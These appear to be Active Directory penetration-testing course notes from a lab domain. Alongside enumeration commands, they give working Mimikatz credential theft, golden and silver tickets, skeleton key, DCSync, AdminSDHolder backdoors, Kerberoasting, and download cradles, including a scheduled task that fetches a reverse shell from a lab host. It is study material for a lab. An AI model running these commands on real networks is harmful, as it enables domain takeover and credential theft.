@@ -1,0 +1,580 @@
+AD-NOTES-CHIRAG
+   Active Directory enables centralized secure management of an entire network. Everything stored in active directory is an object.
+
+##Active Directory - Components
+
+• Schema - Defines objects and their attributes (Windows User, Servers etc).
+• Query and Index mechanism - Provides searching and publication of objects and their properties.
+• Global Catalog - Contains information about every object in the directory.
+• Replication Service - Distributes information across domain controllers.
+
+##Active Directory - Structure
+Forest, domains and organization units(OUs) are the basic building blocks of any active directory structure.
+Forest - A forest is the security boundary as per Microsoft may contain multiple domains and each domain may contain multiple OUs.
+
+##Powershell - Basics
+Powershell scripts uses cmdlets, native commands, functions, .Net, DLLs, Windows API and much more in a single program(script).Powershell scripts are really powerfull and could do much stuff in less lines. Easy to write, easy syntax and easy to execute.
+#Execution Policy
+It is not a security measure, It is present to prevent user from accidently executing scripts.
+There are several ways to bypass it 
+powershell -ExecutionPolicy bypasspowershell -ep Bypass$env:PSExecutionPolicyPreference = "bypass"
+
+#Get-Help
+Get-Help Get-Item -- Shows a brief help about the cmdlet or topic. Supports wildcard (*). Comes with various options and filters. Get-Help -? or help -? -- could be used to display help.Get-Help About_<topic> could be used to get help for conceptual topics
+Get-Help * --Lists everything about the help topics.
+Get-Help process --List everything which contains the word process.
+Update-Help --Updates the help system (v3+)
+Get-Help Get-Item -Full --List full help about a topic (Get-Item cmdlet in this case).
+Get-Help Get-Item -Examples --Lists example of how to run a cmdlet (Get-Item cmdlet in this case).
+
+#What is cmdlets ?
+Cmdlets are used to perform an action and a .Net object is returned as the output. Cmdlets accept parameters for different operations. They have aliases. There are NOT executables, you can write your own cmdlet with few lines of script. Get-Command -CommandType cmdlet -- This list all the cmdlets in the current powershell session
+Get-Process --Lists processes running on the system.
+
+#Powershell Modules basic
+Import-Module <modulepath>
+Get-Command -Module <modulename> -- Get all the commands which is imported from the module
+
+##Download Cradles
+iex (New-Object Net.WebClient).DownloadString('http://ip:port/file.ps1')
+$ie=New-Object -ComObject InternetExplorer.Application;$ie.visible=$False;$ie.navigate('http://ip:port/file.ps1');sleep 5;$response=$ie.Document.body.innerHTML;$ie.quit();iex $response
+#Powershell v3 onwards
+iex(iwr 'http://ip:port/file.ps1')
+$h = New-Object -ComObject Msxml2.XMLHTTP;$h.open('GET', 'http://ip:port/file.ps1', $false);$h.send();iex $h.responseText
+$wr = [System.Net.WebRequest]::Create("http://ip:port/file.ps1")$r = $wr.GetResponse()iex([System.IO.StreamReader]($r.GetResponseStream())).ReadToEnd()
+
+##How to interact with active directory in lab
+
+• [ADSI]
+• .Net Classes (System.DirectoryServices.ActiveDirectory)
+• Native Executables
+• Powershell (.Net Classes & WMI)
+
+Domain Enumeration
+Enumeration is most important during any engagement. Command to find the current domain name using .Net Classes
+$ADClass = [System.DirectoryServices.ActiveDirectory.Domain]$ADClass::GetCurrentDomain()
+Load PowerView
+cd C:\AD\Tools. .\PowerView.ps1
+Load AD Module
+cd C:\AD\Tools\ADModule-master\Import-Module .\Microsoft.ActiveDirectory.Management.dllImport-Module .\ActiveDirectory\ActiveDirectory.psd1
+Get Current Domain Information
+#PowerViewGet-NetDomain
+#AD ModuleGet-ADDomain
+Get object of another domain
+#PowerViewGet-NetDomain -Domain moneycorp.local
+#AD ModuleGet-ADDomain -Identity moneycorp.local
+Find Domain SID
+#PowerViewGet-DomainSID
+#AD Module(Get-ADDomain).DomainSID
+Get Domain policy for current domain
+#PowerViewGet-DomainPolicy(Get-DomainPolicy)."system access" --Password Policy
+(Get-DomainPolicy)."Kerberos Policy" --Kerberos Policy
+Get Domain policy from another domain
+(Get-DomainPolicy -domain moneycorp.local)."system access"
+Get domain controller information for current domain
+#PowerViewGet-NetDomainController
+#AD ModuleGet-ADDomainController
+Get domain controller information for another domian
+#PowerViewGet-NetDomainController -Domain moneycorp.local
+#AD ModuleGet-ADDomainController -DomainName moneycorp.local -Discover
+Get list of all users in the current domain
+#PowerViewGet-NetUser
+#AD ModuleGet-ADUser -Filter * -Properties *
+Get the details for specific user in the current domain
+#PowerViewGet-NetUser -Username student1
+#AD ModuleGet-ADUser -Identity student1 -Properties *
+Get list of all properties for the users in the current domain
+#PowerViewGet-UserProperty
+#AD ModuleGet-ADUser -Filter * -Properties * | select -First 1 | Get-Member -MemberType *Property |  select Name
+Get list of specific property for all users in the current domain
+#PowerViewGet-UserProperty -Properties pwdlastset
+#AD ModuleGet-ADUser -Filter * -Properties * |  select name,@{expression={[datetime]::fromFileTime($_.pwdlastset)}}
+Search for a particular string in a user's attributes
+#PowerViewFind-UserField -SearchField Description -SearchTerm "built"
+#AD ModuleGet-ADUser -Filter 'Description -like "*built*"' -Properties Description | select name,Description
+Get list of computers in the current domain
+#PowerViewGet-NetComputer
+#AD ModuleGet-ADComputer -Filter *
+Get all the not null properties for the computers
+#PowerViewGet-NetComputer -FullData
+#AD ModuleGet-ADComputer -Filter * -Properties *
+Get list of computers running server 2016 computers
+#PowerViewGet-NetComputer -OperatingSystem "*Server 2016*"
+#AD ModuleGet-ADComputer -Filter 'OperatingSystem -like "*Server 2016*" -Properties OperatingSystem | select Name,OperatingSystem
+Check if the computers are alive. This will ping the computers in the network. Possibilities of false positive if ping is block in the network crossing firewalls.
+#PowerViewGet-NetComputer -Ping
+#AD ModuleGet-ADComputer -Filter * -Properties DNSHostName | %{Test-Connection -Count 1 -ComputerName $_.DNSHostName}
+Get information about the Groups from current domain
+#PowerViewGet-NetGroup
+#AD ModuleGet-ADGroup -Filter *
+Get information about the Groups from another domain
+#PowerViewGet-NetGroup -Domain moneycorp.local
+#AD ModuleGet-ADGroup -Filter * -Server moneycorp.local
+Get full information about the Group from the current domain
+#PowerViewGet-NetGroup 'Domain Admins' -FullData
+#AD ModuleGet-ADGroup -Filter * -Properties
+Get information about the Group using wildcard search
+#PowerViewGet-NetGroup -GroupName *admin*
+#AD ModuleGet-ADGroup -Filter 'Name -like "*admin*"' | select name
+Get the member list from the groups
+#PowerViewGet-NetGroupMember -GroupName "Domain Admins" -Recurse
+#AD ModuleGet-ADGroupMember -Identity "Domain Admins" -Recursive
+Get group membership for a user
+#PowerViewGet-NetGroup -UserName "student1"
+#AD ModuleGet-ADPrincipalGroupMembership -Identity student1
+Get list of all the local groups on a machine (needs administrator privileges on non dc machine)
+#PowerViewGet-NetLocalGroup -ComputerName dcorp-dc.dollarcorp.moneycorp.local -ListGroups
+Get members of all the local groups on a machine (needs administrator privileges on non dc machine)
+#PowerViewGet-NetLocalGroup -ComputerName dcorp-dc.dollarcorp.moneycorp.local -Recurse
+Get actively logged users on a computer (need local admin rights on the target)
+#PowerViewGet-NetLoggedon -ComputerName <servername>
+Get locally logged users on a computer (needs remote registry on the target -started by-default on server os)
+#PowerViewGet-LoggedonLocal -Computer dcorp-dc.dollarcorp.moneycorp.local
+Get the last logged user on a computer (needs administrative rights and remote registry on the target)
+#PowerViewGet-LastLoggedOn -ComputerName <servername>
+Find shares on hosts in the current domain which are readable
+#PowerViewInvoke-ShareFinder -Verbose
+Find shares on hosts in the current domain which are readable excluding default shares
+#PowerViewInvoke-ShareFinder -Verbose -ExcludeStandard -ExcludePrint -ExcludeIPC
+Find sensitive files on computers in the domain
+#PowerViewInvoke-FileFinder -Verbose
+Get all file servers of the domain
+#PowerViewGet-NetFileServer
+##What is Group Policy ?
+Group Policy provides the ability to manage configuration and changes easily & centrally in AD
+Allows Configuration of - 
+• Security Settings
+• Registry-based policy settings
+• Group policy preferences like startup/shutdown/log-on/logoff scripts settings
+• Software Installation
+GPO can be abused for various attacks like privilege escalation, backdoors, persistence etc.
+Find all the group policy in the current domain
+#PowerViewGet-NetGPO
+Find all the group policy display name
+#PowerViewGet-NetGPO | select displayname
+Find the group policy applied on the student machine
+#PowerViewGet-NetGPO -ComputerName dcorp-stdadmin.dollarcorp.moneycorp.local
+Get users which are in a local group of a machine using GPO
+#PowerViewFind-GPOComputerAdmin -ComputerName dcorp-stdadmin.dollarcorp.moneycorp.local
+Get machines where the given user is member of a specific group
+#PowerViewFind-GPOLocation -UserName student1 -Verbose
+Get OUs from the current domain
+#PowerViewGet-NetOU -FullData
+## Access Control Model
+Enables control on the ability of a process to access objects and other resources in active directory based on:
+• Access Tokens (security context of a process - identity and privileges of user)
+• Security Descriptors (SID of the owner, Discretionary ACL (DACL) and System ACL (SACL))
+Every object in active directory has 3 things in active directory
+• SACL
+• DACL
+• OwnerDACL & SACL are made of Access Control Entries (ACE)
+
+#Access Control List (ACL)
+It is a list of Access Control Entries (ACE) - ACE corresponds to individual permission or audits access. Who has permission and what can be done on an object ?
+There are 2 types of ACLs
+• DACL - Defines the permissions trustees(a user or group) have on an object.
+• SACL - Logs success and failure audit messages when an object is accessed.
+
+#Enumerate ACLs
+Get the ACLs associated with the specified object
+#PowerViewGet-ObjectAcl -SamAccountName student1 -ResolveGUIDs
+Get the ACLs associated with the specified prefix to be used for search
+#PowerViewGet-ObjectAcl -ADSprefix 'CN=Administrator,CN=Users' -Verbose
+#AD Module(Get-Acl 'AD:\CN=Administrator,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local').Access
+Get the ACLs associated with the specified LDAP path to be used for search
+#PowerViewGet-ObjectAcl -ADSpath "LDAP://CN=Domain Admins,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local" -ResolveGUIDs -Verbose
+Search for interesting ACEs
+#PowerViewInvoke-ACLScanner -ResolveGUIDs
+Get the ACLs associated with the specified path
+#PowerViewGet-PathAcl -Path "\\dcorp-dc.dollarcorp.moneycorp.local\sysvol"
+
+##Domain Trust
+In an AD environment, trust is a relationship between two domains or forests which allows users of one domain or forest to access resources in the other domain or forest.Trust can be automatic (parent-child, same forest etc). or established (forest, external).Trusted Domain Objects (TDOs) represent the trust relationships in a domain.
+##Trust Properties
+There are 2 properties of trust
+• Trust Direction
+• Trust Transitivity
+#Trust Direction
+
+• One-Way Trust - Unidirectional. Users in the trusted domain can access resources in the trusting domain but the reverse is not true.
+• Two-Way Trust - Bi-directional. Users of both domain can access resources in the other domain.
+
+#Trust Transitivity
+
+• Transitive - Can be extended to establish trust relationships with other domains. All the default intra-forest trust relationships (Tree-root, Parent-Child) between domains within a same are transitive two-way trusts.
+• Non Transitive - Cannot be extended to other domains in the forest. Can be two-way or one-way. This is the default trust (called external trust) between two domains in different forests when forests do not have a trust relationship.
+##Types of Trust
+#Default / Automatic Trusts
+Parent-Child trust - It is created automatically between the new domain and the domain that precedes it in the namespace hierarchy, whenever a new domain is added in a tree. For example, dollarcorp.moneycorp.local is a child of moneycorp.local. This trust is always two-way transitive.
+Tree-Root trust - It is created automatically between whenever a new domain tree is added to a forest root. This trust is always two-way transitive.
+
+#Shortcut Trusts
+Used to reduce access time in complex trust scenarios. Can be one-way or two-way transitive trust
+
+#External Trust
+Between two domains in different forests when forests do not have a trust relationship. Can be one-way or two-way non transitive trust. 
+
+#Forest Trust
+It is created between forest root domain. Cannot be extended to a third forest (no implicit trust). Can be one-way or two-way and transitive or non transitive trust.
+
+##Domain Trust Mapping
+Get a list of all domain trusts for the current domain 
+#PowerViewGet-NetDomainTrust
+#AD ModuleGet-ADTrust
+Get a list of all domain trusts for another domain 
+#PowerViewGet-NetDomainTrust -Domain us.dollarcorp.moneycorp.local
+#AD ModuleGet-ADTrust -Identity us.dollarcorp.moneycorp.local
+Get details about the current forest
+#PowerViewGet-NetForest
+#AD ModuleGet-ADForest
+Get details about the other forest
+#PowerViewGet-NetForest -Forest eurocorp.local
+#AD Module
+Get-ADForest -Identity eurocorp.local
+Get all domains in the current forest
+#PowerViewGet-NetForestDomain
+#AD Module(Get-ADForest).Domains
+Get all domains for another forest
+#PowerViewGet-NetForestDomain -Forest eurocorp.local
+#AD Module(Get-ADForest -Identity eurocorp.local).Domains
+Get all global catalogs for the current forest
+#PowerViewGet-NetForestCatalog
+#AD ModuleGet-ADForest  | select -ExpandProperty GlobalCatalogs
+Get all global catalogs for another forest
+#PowerViewGet-NetForestCatalog -Forest eurocorp.local
+#AD ModuleGet-ADForest -Identity eurocorp.local  | select -ExpandProperty GlobalCatalogs
+Get details about the forest trust
+#PowerViewGet-NetForestTrust
+#AD ModuleGet-ADTrust - Filter 'msDS-TrustForestTrustInfo -ne "$null"'
+
+##User Hunting
+Find all machines on the current domain where the current user has local admin access
+#PowerViewFind-LocalAdminAccess -verbose
+This function queries the DC of the current or provided domain for a list of computers (Get-NetComputer) and then use multi-threaded and check local admin access on each machine
+#PowerViewInvoke-CheckLocalAdminAccess
+Use WMI to find if current user has local admin access on any computers in the domain
+#To load WMI script. .\Find-WMILocalAdminAccess.ps1
+
+
+Find local admins on all machines of the domain (needs administrator privileges on non-dc machines
+#PowerViewInvoke-EnumerateLocalAdmin -Verbose
+This function queries the DC of the current or provided domain for a list of computers (Get-NetComputer) and then use multi-threaded script on each machine.
+Get-NetLocalGroup
+Find computers where a domain admin (or specified user/group) has sessions:
+#PowerViewInvoke-UserHunter
+#PowerViewInvoke-UserHunter -GroupName "RDPUsers"
+This functions queries the DC of the current or provided domain for members of the given group (Domain Admins by default) using (Get-NetGroupMember), gets a list of computers (Get-NetComputer) and list sessions and logged on users from each machine.
+#PowerViewGet-NetSession
+#PowerViewGet-NetLoggedon
+To confirm admin access
+#PowerViewInvoke-UserHunter -CheckAccess
+This option queries the DC of the current or provided domain for members of the given group (Domain Admins by default) using (Get-NetGroupMember), get a list of only high traffic server (DC, File Servers & Distributed File Servers) for less traffic generation and list sessions and logged on users (Get-NetSession / Get-NetLoggedon) from each machine
+Find computers where a domain admin is logged-in
+#PowerViewInvoke-UserHunter -Stealth
+ ##Local Privilege Escalation 
+In an AD environment, there are multiple scenarios which lead to privilege escalation. We had a look at the following 
+• Hunting for Local Admin access on other machines 
+• Hunting for high privilege domain accounts (like a Domain Administrator)
+There are various ways of locally escalating privileges on Windows box: 
+• Missing patches
+• Automated deployment and AutoLogon passwords in clear text
+• AlwaysInstallElevated (Any user can run MSI as SYSTEM)
+• Misconfigured Services
+• DLL Hijacking and more 
+We can use below tools for complete coverage
+• PowerUp: https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc
+• BeRoot: https://github.com/AlessandroZ/BeRoot
+• Privesc: https://github.com/enjoiz/Privesc
+
+#Identify  services Issues using PowerUp
+Get services with unquoted paths and a space in their name
+#PowerUpGet-ServiceUnquoted -Verbose
+Get services where the current user can write to its binary path or change arguments to the binary
+#PowerUpGet-ModifiableServiceFile -Verbose
+Get the services whose configuration current user can modify
+#PowerUpGet-ModifiableService -Verbose
+List the bin path of all the services using WMI
+Get-WmiObject -Class win32_service | select pathname
+Run all checks for privilege escalation
+#PowerUpInvoke-AllChecks
+#BeRoot.\beRoot.exe
+#PrivescInvoke-PrivEsc
+
+##Enumerating Domain using BloodHound
+What is BloodHound ?
+Provides GUI for AD entities and relationships for the data collected by its ingestors. Uses Graph Theory for providing the capability of mapping shortest path for interesting things like Domain Admins. There are built-in queries for frequently used actions. Also supports custom Cypher queries. 
+BloodHound has 2 parts
+
+• Ingester - This is used to collect the data from the environment. SharpHound is the ingester for bloodhound data collection.
+• GUI - This is used to uploaded the collected data and view the relationships in GUI Mode.
+Collect data using SharpHound
+#Load Sharphound powershell script. .\Sharphound.ps1
+#Collect all data from the environmentInvoke-BloodHound -CollectionMethod All -Verbose
+#Collect session data from the environmentInvoke-BloodHound -CollectionMethod LoggedOn -Verbose
+
+##Lateral Movement
+
+PSRemoting - It's administrative utility which allows system administrator to manage the system. It uses 5985.5986 port. It can help you to get elevated shell on the target system. It requires admin privilege on the target system.
+There are 2 types of PSRemoting
+One-to-One
+Enter-PSSession -ComputerName dcorp-adminsrv.dollarcorp.moneycorp.local
+One-to-Many
+Invoke-Command -ComputerName dcorp-adminsrv.dollarcorp.moneycorp.local -ScriptBlock {whoami;hostname}
+Invoke-Command -ScriptBlock {whoami} -ComputerName (Get-Content C:\AD\Tools\comp.txt)
+Invoke-Command -ComputerName dcorp-adminsrv.dollarcorp.moneycorp.local -FilePath C:\AD\Tools\PowerUp.ps1  
+Over-Pass-The hash
+Invoke-Mimikatz -Command '"sekurlsa::pth /user:srvadmin /domain:dollarcorp.moneycorp.local /ntlm:a98e18228819e8eec3dfa33cb68b0728 /run:powershell.exe"'
+
+## Domain Persistence
+Kerberos is the basis of authentication in a windows active directory environment. It has been constantly attacked since it was implemented with new attacks and scrutiny every couple of years.
+
+• NTLM password hash for kerberos RC4 encryption.
+• Logon Ticket(TGT) provides user auth to DC.
+• Kerberos policy only checked when TGT is created.
+• DC validates user account only when TGT > 20 mins.
+• 
+• Service Tickets (TGS) PAC validation is optional & rare
+• Server LSASS sends PAC validation request to DC's netlogon service (NRPC)
+• If it runs as a service, PAC validation is optional (disabled)
+• If a service runs as System, it performs server signature verification on the PAC (Computer Account long-term key).
+
+#Golden Ticket
+A golden ticket is signed and encrypted by the hash of KRBTGT account which makes it a valid TGT ticket.Since user account validation is not done by Domain Controller (KDC service) until TGT is older than 20 minutes, we can use even deleted/ revoked accounts.The KTBTGT user has could be used to impersonate any user with any privileges from even a non-domain machine.Password change has no effect on this attack.
+Execute mimikatz on DC as Domain Admin to get KRBTGT hash
+Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -ComputerName dcorp-dc
+Create golden ticket for administrator account
+Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'
+WMI command to find the operating system details from the remote host
+Get-WmiObject -Class win32_operatingsystem -ComputerName dcorp-dc.dollarcorp.moneycorp.local
+
+#Silver Ticket
+A valid TGS (Golden Ticket is a valid TGT).Encrypted and Signed by the NTLM hash of the service account / computer account (Golden ticket is signed by hash of krbtgt) of the service running with that account.Services rarely check PAC (Privileged Attribute Certificate).Services will allow access only to the services themselves.Reasonable persistence period (default 30 days for computer accounts).
+Using hash of the domain controller computer account, below command provides access to shares on the DC.
+Invoke-Mimikatz -Command '"kerberos::golden /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /target:dcorp-dc.dollarcorp.moneycorp.local /service:CIFS /rc4:e214e73b73085c290421f085f6ed67bb /user:Administrator /ptt"'
+Schedule the task
+schtasks /create /S dcorp-dc.dollarcorp.moneycorp.local /SC Weekly /RU "NT Authority\SYSTEM" /TN "STCheck" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.68:8080/Invoke-PowerShellTcp.ps1''')'"
+Execute the task
+schtasks /Run /S dcorp-dc.dollarcorp.moneycorp.local /TN "STCheck"
+
+#Skeleton Key
+Skeleton key is a persistence technique where it is possible to patch a Domain Controller (lsass process) so that is allows access as any user with a single password.The attack was discovered by Dell Secureworks used in a malware named the skeleton key malwareAll the publicly known methods are NOT persistent across reboots. We cannot patch lsass twice(the attack would fail)
+Use the below command to inject a skeleton key (password would be mimikatz) on a Domain Controller of choice. DA privileges required
+Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"' -ComputerName dcorp-dc.dollarcorp.moneycorp.local
+Now it is possible to access any machine with a valid username and password as "mimikatz"
+Enter-PSSession -ComputerName dcorp-dc.dollarcorp.moneycorp.local -Credential dcorp\administrator
+You can access other machines as well as long as they authenticate with the DC which hash been patched and the DC is not rebooted.
+In case lsass is running as a protected process, we can still use Skeleton Key but it needs the mimikatz driver (mimidriv.sys) on disk of the target DC
+privilege::debug!+!processprotect /process::lsass.exe /removemisc::skeleton!-
+Note that above command would be very noisy in logs - Service Installation (Kernel mode driver)
+
+#DSRM
+DSRM is Directory Services Restore Mode.There is a local administrator on every DC called "Administrator" whose password is the DSRM password. DSRM password (SafeModePassword) is required when a server is promoted to Domain Controller and it is rarely changes. After altering the configuration on the DC, it is  possible to pass the NTLM has of this user to access the DC. This is used when domain controller needs to be booted in safe mode.DSRM administrator is not allowed to logon over the network on the DC.
+DUMP DSRM password (needs DA privs)
+Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"' -ComputerName dcorp-dc.dollarcorp.moneycorp.local
+Compare the administrator hash with the Administrator hash of the below command
+Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -ComputerName dcorp-dc.dollarcorp.moneycorp.local
+Since DSRM user is the local administrator of the DC, we can pass the hash to authenticate.But, the logon behavior for the DSRM account needs to be changed before we can use its hash for network logon.
+Enter-PSSession -ComputerName dcorp-dc.dollarcorp.moneycorp.localGet-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" Set-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name "DsrmAdminLogonBehavior" -Value 2 
+New-ItemPropery "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name "DsrmAdminLogonBehavior" -Value 2 -PropertyType DWORD
+Use below command to pass the hash for DSRM user
+Invoke-Mimikatz -Command '"sekurlsa::pth /domain:dcorp-dc /user:Administrator /ntlm:a102ad5753f4c441e3af31c97fad86fd /run:powershell.exe"'
+Try to access the C drive of the DC
+ls \\dcorp-dc\c$
+
+#Custom SSP
+A Security Support Provider (SSP) is a DLL which provides ways for an application to obtain an authenticated connection. Some SSP Packages by Microsoft areNTLMKerberosWdigestCredSSP
+Mimikatz provides a custom SSP - mimilib.dll. This SSP logs local logons, service account and machine account passwords in clear text on the target server.
+We can use either of the ways:Drop the mimilib.dll to system32 and add mimilib to HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages:
+$package = Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\ -Name 'Security Packages' | select -ExpandProperty 'Security Packages'$packages += "mimilib"
+Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\ -Name 'Security Packages' -Value $packagesSet-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\ -Name 'Security Packages' -Value $packages
+Using Mimikatz, inject into lsass (Not stable with Server 2016):
+Invoke-Mimikatz -Command '"misc::memssp"'
+All local logons on the DC are logged to
+C:\Windows\system32\kiwissp.log
+
+#AdminSDHolder
+Resides in the System container of a domain and used to control the permissions - Using an ACL - for certain built-in privileged groups (called Protected Groups)Security Descriptor Propagator (SDPROP) runs every hour and compares the ACL of protected groups and members with the ACL of AdminSDHolder and any differences are overwritten on the object ACL.
+With Domain Admin privileges (Full Control / Write Permissions) on the AdminSDHolder object, it can be used as a backdoor / persistence mechanism by adding a user with Full Permissions (or other interesting permissions) to the AdminSDHolder object.In 60 minutes (when SDPROP runs), the user will be added with full control of the protected groups like Domain Admins without actually being a member of it. 
+Add FullControl permissions for a user to the AdminSDHolder as DA
+#PowerViewAdd-ObjectACL -TargetADSprefix 'CN=AdminSDHolder,CN=System' -PrincipalSamAccountName student68 -Rights All -Verbose
+#AD Module - With custom script (Set-ADACL)Set-ADACL -DistinguishedName 'CN=AdminSDHolder,CN=System,DC=dollarcorp,DC=moneycorp,DC=local' -Principal student68 -Verbose
+Other interesting permissions (ResetPassword, WriteMembers) for a user to the AdminSDHolder
+Add-ObjectAcl -TargetADSprefix 'CN=AdminSDHolder,CN=System' -PrincipalSamAccountName student68 -Rights ResetPassword -Verbose
+Add-ObjectAcl -TargetADSprefix 'CN=AdminSDHolder,CN=System' -PrincipalSamAccountName student68 -Rights WriteMembers -Verbose
+Run SDPROP manually using Invoke-SDPropagator.ps1
+Invoke-SDPropagator -timeourMinutes 1 -showProgress -Verbose
+Check the Domain Admins permission as normal user
+#PowerViewGet-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | ?{$_.IdentityReference -match 'student68'}
+#AD Module(Get-Acl -Path 'AD:\CN=Domain Admins,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local').Access | ?{$_.IdentityReference -match 'student68'}
+Abusing FullControl
+#PowerView DevAdd-DomainGroupMember -Identity 'Domain Admins' -Members student68 -Verbose
+#AD ModuleAdd-ADGroupMember -Identity 'Domain Admins' -Members student68
+Abusing ResetPassword
+#PowerView DevSet-DomainUserPassword -Identity student68 -AccountPassword (ConvertTo-SecureString "Password@123" -AsPlainText -Force) -Verbose
+#AD ModuleSet-ADAccountPassword -Identity student68 -NewPassword (ConvertTo-SecureString "Password@123" -AsPlainText -Force) -Verbose
+Add FullControl rights
+#PowerViewAdd-ObjectAcl -TargetDistinguishedName 'DC=dollarcorp,DC=moneycorp,DC=local' -PrincipalSamAccountName student68 -Rights All -Verbose
+#AD ModuleSet-ADACL -DistinguishedName 'DC=dollarcorp,DC=moneycorp,DC=local' -Principal student68 -Verbose
+Add rights for DCSync
+#PowerViewAdd-ObjectAcl -TargetDistinguishedName 'DC=dollarcorp,DC=moneycorp,DC=local' -PrincipalSamAccountName student68 -Rights DCSync -Verbose
+#AD ModuleSet-ADACL -DistinguishedName 'DC=dollarcorp,DC=moneycorp,DC=local' -Principal student68 -GUIDRight DCSync -Verbose
+Execute DCSync
+Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
+
+#Security Descriptors
+Persistence using ACLs specifically host based security descriptors. Once we have local admin privileges on the box it is possible to modify the security descriptor on the target system like SACL & DACL etc of remote access methods such as WMI, PSRemoting, Remote Registry so that even non admin users can access it target system and execute commands remotely.
+It is possible to modify Security Descriptors (security information like Owner,primary group, DACL & SACL) of multiple remote access methods (securable objects) to allow access to non-admin users.Administrative privileges are required for this. It, of course, works as a very useful and impactful backdoor mechanism.
+Security Descriptor Defination Language(SDDL) defines the format which is used to describe a security descriptor. SDDL uses ACE strings for DACL and SACL:ace_type;ace_flags;rights;object_guid;inherit_
+
+ACLs can be modified to allow non-admin users access to securable objectsModify the security descriptor for WMIOn local machine for student68
+#Set-RemoteWMI.ps1Set-RemoteWMI -UserName student68 -Verbose
+ On remote machine for student68 without explicit credentials
+Set-RemoteWMI -UserName student68 -ComputerName dcorp-dc.dollarcorp.moneycorp.local -namespace 'root\cimv2' -Verbose
+On remote machine with explicit credentials. Only root\cimv2 and nested namespaces
+Set-RemoteWMI -UserName student68 -ComputerName dcorp-dc.dollarcorp.moneycorp.local -Credential administrator -namespace 'root\cimv2' -Verbose
+On remote machine remove permissions
+Set-RemoteWMI -UserName student68 -ComputerName dcorp-dc.dollarcorp.moneycorp.local -namespace 'root\cimv2' -Remove -Verbose
+Modify the security descriptor for PSRemotingOn Local machine for student 68
+#Set-RemotePSRemoting.ps1Set-RemotePSRemoting -UserName student68 -Verbose
+On remote machine for student68 without credentials
+Set-RemotePSRemoting -UserName student68 -ComputerName dcorp-dc.dollarcorp.moneycorp.local -Verbose
+On remote machine, remove the permissions
+Set-RemotePSRemoting -UserName student68 -ComputerName dcorp-dc.dollarcorp.moneycorp.local -Remove -Verbose
+Modify the security descriptors for Remote RegistryUsing DAMP, with admin privs on remote machine
+Add-RemoteRegBackdoor -ComputerName dcorp-dc.dollarcorp.moneycorp.local -Trustee student68 -Verbose
+As student68, retrieve machine account hash
+Get-RemoteMachineAccountHash -ComputerName dcorp-dc.dollarcorp.moneycorp.local -Verbose
+Retrive local account hash
+Get-RemoteLocalAccountHash -ComputerName dcorp-dc.dollarcorp.moneycorp.local -Verbose
+Retrieve domain cached credentials
+Get-RemoteCachedCredential -ComputerName dcorp-dc.dollarcorp.moneycorp.local -Verbose
+
+##Privilege Escalation
+#Kerberoast
+Offline cracking of service account passwordsThe kerberos session ticket (TGS) has a server portion which is encrypted with the password hash of service account. This makes it possible to request a ticket and do offline password attack.Service accounts are many times ignored (passwords are rarely changed) and have privileged access. Password hashes of service accounts could be used to create silver tickets.
+Find User accounts used as Service accounts
+#PowerViewGet-NetUser -SPN
+#AD ModuleGet-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
+Request a TGS
+Add-Type -AssemblyName System.IdentityModelNew-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local"
+#PowerViewRequest-SPNTicket
+Check if the TGS has been granted
+klist
+Export all tickets using Mimikatz
+Invoke-Mimikatz -Command '"kerberos::list /export"'
+Crack the Service account password
+python.exe .\tgsrepcrack.py .\10k-worst-pass.txt 1-40a10000-student68@MSSQLSvc~dcorp-mgmt.dollarcorp.moneycorp.local-DOLLARCORP.MONEYCORP.LOCAL.kirbi
+
+#Targeted Kerberoasting - AS-REPs
+If a user's UserAccountControl settings have "Do not require Kerberos preauthentication" enabled i.e. Kerberos preauth is disabled, it is possible to grab user's crackable AS-REP and brute-force it offline.With sufficient rights (GenericWrite or GenericAll), kerberos preauth can be forced disabled as well.
+Enumerating accounts with Kerberos Preauth disabled
+#PowerView DevGet-DomainUser -PreauthNotRequired -Verbose
+#AD Module Get-ADUser -Filter {DoesNotRequirePreAuth -eq $True} -Properties DoesNotRequirePreAuth
+Force disable Kerberos PreauthLet's enumerate the permissions for RDPUsers on ACL's
+#PowerView DevInvoke-ACLScanner -ResolveGUIDs | ?{$_.IdentityReferenceName -match "RDPUsers"}
+Set-DomainObject -Identity Control68User -XOR @{useraccountcontrol=4194304} -Verbose
+Get-DomainUser -PreauthNotRequired -Verbose
+Request encrypted AS-REP for offline brute-forceLet's use ASREPRoast
+Get-ASREPHash -UserName VPN68User -Verbose
+To enumerate all users with Kerberos preauth disabled and request a hash
+Invoke-ASREPRoast -Verbose
+Cracking the hashUsing bleeding-jumbo branch of John The Ripper, we can brute-force the hashes offline
+./john vpn68user.txt --wordlist=wordlist.txt
+
+#Targeted Kerberoasting - Set SPN
+With enough rights (GenericAll/GenericWrite), a target user's SPN can be set to anything(unique in the domain)We can then request a TGS without special privileges. The TGS can then be "kerberoasted"
+Let's enumerate the permissions for RDPUsers on ACL's
